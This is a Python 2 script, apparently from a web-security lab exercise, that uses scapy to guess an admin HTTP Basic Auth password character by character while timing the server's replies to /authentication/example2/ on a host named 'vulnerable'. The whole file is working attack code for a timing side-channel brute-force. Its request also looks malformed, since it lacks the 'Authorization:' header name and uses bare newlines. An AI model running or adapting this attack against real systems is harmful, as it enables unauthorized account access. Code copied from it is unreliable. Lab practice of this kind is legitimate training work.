import base64
import sys
import scapy.all as scapy

try:
    password = sys.argv[1]
    if password == 'blank':
        password = ''
except:
    print 'Usage: authex2.py password\nUse blank to pass an empty string'
    sys.exit(0)

username = 'admin'

#For loop to generate characters of the password in argument + a-z
for i in range(ord('a'), ord('z')+1):
    #Build new password with argument + chr(i)
    newpass = password + chr(i)
    #print 'Trying ' + username + ':' + password + chr(i)
    login = username + ':' + newpass
    #Base 64 encode the username:password pair
    encoded = base64.b64encode(login)
    #print 'b64: ' + encoded
    #TCP Handshake with webserver
    #print 'Building TCP Handshake...'
    syn = (scapy.IP(dst='vulnerable') / scapy.TCP(dport=80, flags='S'))
    syn_ack = scapy.sr1(syn,verbose=0)
    #print 'Sending GET request...'
    getStr = 'GET /authentication/example2/ HTTP/1.1\nHost: vulnerable\n' \
            + 'Basic ' + encoded
    getReply = scapy.sr1(scapy.IP(dst='vulnerable') / \
            scapy.TCP(dport=80, sport=syn_ack[scapy.TCP].dport, seq=syn_ack[scapy.TCP].ack, \
            ack=syn_ack[scapy.TCP].seq + 1, flags='A') / \
            getStr, verbose=0)
    print 'Response time for ' + newpass + ': ' + str(getReply.time)
